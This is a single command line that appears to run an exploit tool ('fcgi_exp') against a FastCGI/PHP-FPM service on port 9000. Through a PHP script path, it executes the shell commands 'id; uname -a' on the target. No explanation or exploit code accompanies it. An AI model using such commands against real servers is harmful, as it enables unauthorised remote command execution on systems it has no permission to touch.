./fcgi_exp system 127.0.0.1 9000 /tmp/a.php "id; uname -a"


